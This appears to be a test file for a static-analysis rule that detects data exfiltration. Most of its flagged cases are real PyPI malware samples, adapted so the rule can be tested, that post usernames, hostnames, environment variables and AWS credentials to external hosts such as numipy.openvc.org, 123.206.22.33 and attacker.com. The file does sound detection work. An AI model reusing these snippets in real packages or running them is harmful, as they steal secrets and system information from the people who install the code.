""" Tests for post-systeminfo rule

    OK cases:
      - sending non-sensitive information
      - using system information without sending
    RULEID cases:
      - distrib
      - tenserflow
      - python-mysql
"""


""" OK: sending non-sensitive information
"""
sender = RequestSender()
rest_request = RESTRequest('POST', 'http://localhost/test',
                            headers={'Test-Header': '1234'},
                            body='{"test": "value"}')
# ok: exfiltrate-sensitive-information
sender.send(rest_request)


""" OK: using system information without sending
"""
if user_name is None:
  # ok: exfiltrate-sensitive-information
  user_name = getpass.getuser()
  
  
""" RULEID: distrib malware
"""
info = socket.gethostname()+' '+' '.join(['%s=%s' % (k,v) for (k,v) in os.environ.items()])+' '
info += [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
posty = "paste="
for i in xrange(0,len(info)):
  if info[i].isalnum():
    posty += info[i]
  else:
    posty += ("%%%02X" % ord(info[i]))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("packageman.comlu.com", 80))
# ruleid: exfiltrate-sensitive-information
s.send("POST / HTTP/1.1\r\n"+
"User-Agent: Python\r\n"+
"Host: packageman.comlu.com\r\n"+
"Content-Type: application/x-www-form-urlencoded\r\n"+
"Content-Length: "+str(len(posty))+"\r\n\r\n"+posty)


""" RULEID: tenserflow malware
"""
def request(url, method='GET', data=None, headers=None):
  try:
      import urllib2 as urlrequest
  except:
      import urllib.request as urlrequest

  req = urlrequest.Request(url=url, data=data, headers=headers)
  return urlrequest.urlopen(req, timeout=10).read()

def detect():
  username = getpass.getuser()
  hostinfo = platform.uname()
  ip = socket.gethostname()
  data = {
      "title": "%s@%s@tenserflow" % (username, ip),
      "body": str(hostinfo)
  }
  headers = {
      'Content-Type': 'application/json'
  }
  # ruleid: exfiltrate-sensitive-information
  request(
      url='http://us.dslab.pw/webhook.php',
      method='POST',
      data=json.dumps(data).encode("utf-8", errors='ignore'),
      headers=headers
  )


""" RULEID: python-mysql malware
"""
def checkVersion():
  user_name = getpass.getuser()
  hostname = socket.gethostname()
  os_version = platform.platform()
  if platform.system() is 'Windows':
      import ctypes
      import locale
      dll_handle = ctypes.windll.kernel32
      loc_lang = locale.getdefaultlocale()
      language = ':'.join(loc_lang)
  elif platform.system() is 'Linux':
      loc_lang = os.popen("echo $LANG")
      language = loc_lang.rea
  ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
  package='pysprak'
  vid = user_name+"###"+hostname+"###"+os_version+"###"+ip+"###"+package
  if sys.version_info>(3,0):
    # todoruleid: exfiltrate-sensitive-information
    request.urlopen(r'http://numipy.openvc.org/spark.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))
  elif sys.version_info<(3,0):
    # ruleid: exfiltrate-sensitive-information
    urllib.urlopen(r'http://numipy.openvc.org/spark.php','vid='+base64.encodestring(vid))
    
    
# ruleid: exfiltrate-sensitive-information
requests.post("http://1.1.1.1", data={'creds': os.getenv("AWS_ACCESS_KEY_ID")})

# ruleid: exfiltrate-sensitive-information
requests.post("http://1.1.1.1", data={'creds': os.getenv("AWS_SECRET_ACCESS_KEY")})

# ruleid: exfiltrate-sensitive-information
requests.post("http://1.1.1.1", data={'creds': os.environ["AWS_ACCESS_KEY_ID"]})


creds = open(os.path.expanduser("~") + ".aws/credentials")
# ruleid: exfiltrate-sensitive-information
requests.post("http://1.1.1.1", data={'creds': creds})

with open("/root/.aws/credentials") as f:
    # ruleid: exfiltrate-sensitive-information
    requests.post("http://1.1.1.1", data={'creds': f.read()})

creds = base64.b64decode(os.getenv("AWS_ACCESS_KEY_ID") + "/" + os.getenv("AWS_SECRET_ACCESS_KEY"))
# ruleid: exfiltrate-sensitive-information
requests.get("http://1.1.1.1/" + creds)

#####
# Real-world test case based on https://github.com/rsc-dev/pypi_malware/blob/master/malware/distrib/distrib-0.1/setup.py
#####
info = socket.gethostname()+' mumpy '+' '.join(['%s=%s' % (k,v) for (k,v) in os.environ.items()])+' '
# Now convert to url encoding
posty = "paste="
for i in xrange(0,len(info)):
    if info[i].isalnum():
        posty += info[i]
    else:
        posty += ("%%%02X" % ord(info[i]))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("attacker.com", 80))
# ruleid: exfiltrate-sensitive-information
s.send("POST / HTTP/1.1\r\n"+
"Host: attacker.com\r\n"+
"Content-Type: application/x-www-form-urlencoded\r\n"+
"Content-Length: "+str(len(posty))+"\r\n\r\n"+posty)


#####
# Real-world test case based on https://github.com/rsc-dev/pypi_malware/blob/master/malware/mybiubiubiu/mybiubiubiu-0.1.6/setup.py
# slidghtly modified since semgrep taint tracking only works in single functions
#####
username = getpass.getuser()
hostname = platform.node()
ip = request("https://enabledns.com/ip",method='GET')
data = {
    "username": str(username),
    "hostname": str(hostname),
    "ip":str(ip),
    "package": "mybiubiubiu",
    "language": "Python %s.%s.%s" % (sys.version_info.major, sys.version_info.minor, sys.version_info.micro),
    "time":str(timenow),
    "submit":"Submit"
}
import urllib.request as urlrequest
# ruleid: exfiltrate-sensitive-information
req = urlrequest.Request(
    url="http://123.206.22.33:5000/p/", 
    method='POST',
    data=json.dumps(data).encode("utf-8", errors='ignore'), 
    headers={'Content-Type': 'application/json'})
req.read()




####
# Real-world test-case based on https://github.com/rsc-dev/pypi_malware/blob/master/malware/nmap-python/nmap-python-0.6.1/setup.py
###
def checkVersion():
    user_name = getpass.getuser()
    hostname = socket.gethostname()
    os_version = platform.platform()
    if platform.system() is 'Windows':
        import ctypes
        import locale
        dll_handle = ctypes.windll.kernel32
        loc_lang = locale.getdefaultlocale()
        language = ':'.join(loc_lang)
    elif platform.system() is 'Linux':
        loc_lang = os.popen("echo $LANG")
        language = loc_lang.rea
    ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
    package='nmap_python'
    vid = user_name+"###"+hostname+"###"+os_version+"###"+ip+"###"+package
    if sys.version_info>(3,0):
        from urllib import request,parse
        # ruleid: exfiltrate-sensitive-information
        request.urlopen(r'http://openvc.org/Version.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))
    elif sys.version_info<(3,0):
        # ruleid: exfiltrate-sensitive-information
        urllib.urlopen(r'http://openvc.org/Version.php','vid='+base64.encodestring(vid))
checkVersion()